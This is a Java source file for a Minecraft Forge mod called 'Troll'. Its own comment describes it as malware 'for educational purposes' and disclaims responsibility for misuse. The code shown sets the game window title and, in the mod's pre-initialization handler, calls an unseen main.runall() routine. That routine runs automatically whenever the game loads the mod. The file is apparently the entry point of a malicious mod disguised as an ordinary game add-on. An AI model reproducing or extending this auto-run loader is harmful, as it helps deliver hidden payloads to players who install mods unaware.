package halq.troll.troll;

import halq.troll.troll.moment.main;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.Mod;
import org.lwjgl.opengl.Display;

/**
 * @author halqq
 * @since 23/05/22
 * @apiNote Malware created for educational purposes, I am not responsible for misuse
 */

@Mod(
        modid = Troll.MOD_ID,
        name = Troll.MOD_NAME,
        version = Troll.VERSION
)
public class Troll {

    public static final String MOD_ID = "halq";
    public static final String MOD_NAME = "Troll";
    public static final String VERSION = "lmao?";


    @Mod.Instance(MOD_ID)
    public static Troll INSTANCE;


    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        Display.setTitle(MOD_NAME + " " + VERSION);
        main.runall();
    }
}
